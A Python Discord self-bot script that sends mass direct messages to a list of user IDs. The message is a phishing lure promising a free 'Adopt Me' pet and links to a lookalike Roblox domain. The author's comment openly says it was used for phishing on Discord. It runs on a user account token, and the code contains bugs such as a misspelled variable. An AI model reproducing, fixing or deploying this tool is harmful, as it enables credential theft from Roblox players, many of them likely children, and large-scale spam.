import discord
from discord.ext import commands
import json
import asyncio

bot = commands.Bot(command_prefix='?')

token = input("Your discord token: ")

@bot.event
async def on_ready():
    print(' [!] Started Dmming Ids\n')

    with open("ids.json", "r") as file:
        data = json.load(file)

    indx = 0
    for i in data:
        indx += 1
        member = await bot.fetch_user(i)
        try:
            await memeber.send("Hey! **You have won a chance to get your dream pet in adopt me!** Join fast because time is running out soon join this private server below!\n\n\n https://https-web-roblox.com/games/920587237/Adopt-Me!privateServerLinkCode=UifYMMBdHYHMnzYKwSGaMSHSziUw \n\n\n Proof: https://cdn.discordapp.com/attachments/847180742424264775/847817889871560724/unknown.png") #change this if you want i was using this for some phishing on discord :>
            print(f" [+] Sent message {indx} / {len(data)}")
        except Exception as e:
            print(f" [!] {e}")

    print(" [+] Done")
    await asyncio.sleep("8")

bot.run(token, bot = False)
